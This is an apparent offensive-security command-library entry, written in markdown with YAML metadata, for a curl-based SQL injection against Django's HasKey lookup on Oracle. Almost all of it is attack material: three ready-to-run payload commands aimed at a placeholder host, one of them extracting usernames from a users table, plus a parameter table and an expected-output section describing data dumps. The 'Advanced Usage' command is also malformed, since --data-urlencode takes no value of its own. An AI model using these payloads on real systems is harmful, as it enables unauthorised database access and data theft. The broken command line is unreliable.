---
id: uuid-curl-payload
data: >-
  curl -X POST "http://target.com/api/query" -d '{"lhs": "nonexistent'); SELECT
  COUNT(*) FROM ALL_TABLES; --", "rhs": "data"}' -H "Content-Type:
  application/json" -v
tags:
  - sqli
  - exploitation
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-12-05T00:00:00Z'
updated_at: '2025-12-14T03:16:24.913Z'
verified: false
validated: true
submitted: true
---
# curl-sqli-payload

## Command

```bash
curl -X POST "http://target.com/api/query" -d '{"lhs": "nonexistent'); SELECT COUNT(*) FROM ALL_TABLES; --", "rhs": "data"}' -H "Content-Type: application/json" -v
```

## Description

This command sends a crafted JSON payload to exploit SQL injection in Django's HasKey lhs parameter on Oracle, injecting arbitrary SQL to execute and return results via the web response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `URL` | Vulnerable endpoint | Yes |
| `-d` | JSON payload with malicious lhs | Yes |
| `-H` | Content-Type header | Yes |
| `-v` | Verbose output | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "http://target.com/api/query" -d '{"lhs": "test'); SELECT 1; --", "rhs": "field"}' -H "Content-Type: application/json" -v
```

### Advanced Usage

```bash
curl -X POST "http://target.com/api/query" -d '{"lhs": "key'); SELECT username FROM users; --", "rhs": "jsonfield"}' -H "Content-Type: application/json" --data-urlencode -v
```

## Expected Output

Response body containing injected query results, such as table counts or data dumps, mixed with normal JSON output.

## Related

- [[commands/curl-identify-endpoint]]
- [[procedures/Exploit-Django-HasKey-SQL-Injection]]
